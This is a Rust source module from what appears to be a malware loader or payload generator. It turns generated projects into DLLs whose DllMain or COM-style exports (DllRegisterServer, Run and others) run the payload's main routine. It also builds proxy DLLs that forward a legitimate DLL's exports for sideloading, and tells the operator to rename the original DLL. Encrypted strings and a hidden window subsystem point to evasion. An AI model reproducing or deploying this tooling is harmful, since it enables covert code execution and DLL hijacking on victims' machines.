//! DLL-specific generation logic.
//!
//! Handles the `[lib] crate-type = ["cdylib"]` toggle, the DllMain entry
//! point (with and without proxy forwarding), and the application of
//! placeholder substitutions to the generated source and Cargo.toml.

use crate::config::Order;
use crate::template_io::search_and_replace;
use anyhow::{Context, Result};
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};

fn build_dll_main_function(is_proxy: bool) -> String {
    if is_proxy {
        r#"
    const DLL_PROCESS_ATTACH: u32 = 1;
    const DLL_PROCESS_DETACH: u32 = 0;

    #[no_mangle]
    #[allow(non_snake_case, unused_variables, unreachable_patterns)]
    extern "system" fn DllMain(
        dll_module: usize,
        call_reason: u32,
        _: *mut ())
        -> bool
    {
        match call_reason {
            DLL_PROCESS_ATTACH => {
                unsafe { proxy::init(); }
                main();
            }
            DLL_PROCESS_DETACH => (),
            _ => ()
        }

        true
    }"#
        .to_string()
    } else {
        r#"
    const DLL_PROCESS_ATTACH: u32 = 1;
    const DLL_PROCESS_DETACH: u32 = 0;

    #[no_mangle]
    #[allow(non_snake_case, unused_variables, unreachable_patterns)]
    extern "system" fn DllMain(
        dll_module: usize,
        call_reason: u32,
        _: *mut ())
        -> bool
    {
        match call_reason {
            DLL_PROCESS_ATTACH => (),
            DLL_PROCESS_DETACH => (),
            _ => ()
        }

        true
    }
    #[no_mangle]
    pub extern "C" fn DllRegisterServer() { main() }
    #[no_mangle]
    pub extern "C" fn DllGetClassObject() { main() }
    #[no_mangle]
    pub extern "C" fn DllUnregisterServer() { main() }
    #[no_mangle]
    pub extern "C" fn Run() { main() }"#
            .to_string()
    }
}

/// Switch the generated project to DLL output: insert the `[lib]` section,
/// the DllMain function, and rename `main.rs` to `lib.rs`.
pub(super) fn apply_dll_format(
    replacements: &mut HashMap<&'static str, String>,
    main_rs_path: &Path,
    is_proxy: bool,
) -> Result<PathBuf> {
    let dll_config = "\n[lib]\ncrate-type = [\"cdylib\"]";
    replacements.insert("{{DLL_FORMAT}}", dll_config.to_string());
    replacements.insert("{{DLL_MAIN}}", build_dll_main_function(is_proxy));

    let lib_rs_path = main_rs_path.with_file_name("lib.rs");
    fs::rename(main_rs_path, &lib_rs_path).with_context(|| {
        format!(
            "Failed to rename main.rs to lib.rs: {}",
            main_rs_path.display()
        )
    })?;
    Ok(lib_rs_path)
}

/// Apply all placeholder substitutions to the source file and Cargo.toml.
pub(super) fn apply_replacements(
    replacements: &HashMap<&str, String>,
    main_path: &Path,
    cargo_path: &Path,
) -> Result<()> {
    for (key, value) in replacements {
        search_and_replace(main_path, key, value)
            .with_context(|| format!("Template replacement failed for key '{}'", key))?;
        search_and_replace(cargo_path, key, value)
            .with_context(|| format!("Cargo.toml replacement failed for key '{}'", key))?;
    }
    Ok(())
}

fn find_proxy_insert_position(content: &str) -> usize {
    content
        .find("use_litcrypt!();")
        .map(|pos| {
            let after = pos + "use_litcrypt!();".len();
            content[after..]
                .find('\n')
                .map(|n| after + n + 1)
                .unwrap_or(after)
        })
        .unwrap_or_else(|| {
            content
                .lines()
                .take_while(|line| line.trim().starts_with("#!") || line.trim().is_empty())
                .map(|l| l.len() + 1)
                .sum::<usize>()
                .min(content.len())
        })
}

/// Generate and inject the proxy DLL forwarding module (`proxy.rs`) and
/// wire it into `lib.rs`.
pub(super) fn apply_proxy_config(order: &Order, folder: &Path) -> Result<()> {
    let proxy_path = order
        .proxy_dll
        .as_ref()
        .ok_or_else(|| anyhow::anyhow!("Proxy DLL path is None when applying proxy config"))?;
    let exports = crate::pe_parser::parse_exports(proxy_path)
        .map_err(anyhow::Error::msg)
        .context("Failed to parse proxy DLL exports")?;

    if exports.is_empty() {
        eprintln!("[-] Warning: proxy DLL has no exports");
    }

    let stem = crate::pe_parser::dll_stem(proxy_path);
    let proxy_output = crate::dll_proxy::generate_proxy(&exports, &stem);

    let src_dir = folder.join("src");
    fs::write(src_dir.join("proxy.rs"), &proxy_output.proxy_source)
        .context("Failed to write proxy.rs")?;

    let lib_rs_path = src_dir.join("lib.rs");
    let content = fs::read_to_string(&lib_rs_path)
        .with_context(|| format!("Failed to read lib.rs: {}", lib_rs_path.display()))?;
    let insert_pos = find_proxy_insert_position(&content);
    let updated = format!(
        "{}\n#[allow(non_upper_case_globals, non_snake_case)]\nmod proxy;\n{}",
        &content[..insert_pos],
        &content[insert_pos..]
    );
    fs::write(&lib_rs_path, updated)
        .with_context(|| format!("Failed to write updated lib.rs: {}", lib_rs_path.display()))?;

    println!(
        "[+] DLL proxying: {} exports forwarded. Rename the original DLL to '{}'",
        exports.len(),
        proxy_output.original_dll_name
    );
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_dll_main_function() {
        let proxy_main = build_dll_main_function(true);
        let non_proxy_main = build_dll_main_function(false);
        assert!(proxy_main.contains("proxy::init()"));
        assert!(!non_proxy_main.contains("proxy::init()"));
    }

    #[test]
    fn test_find_proxy_insert_position() {
        let source = "#![windows_subsystem = \"windows\"]\n\n#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();\n\nuse std::include_bytes;\n";
        let pos = find_proxy_insert_position(source);
        assert!(source[..pos].contains("use_litcrypt!();"));
    }
}
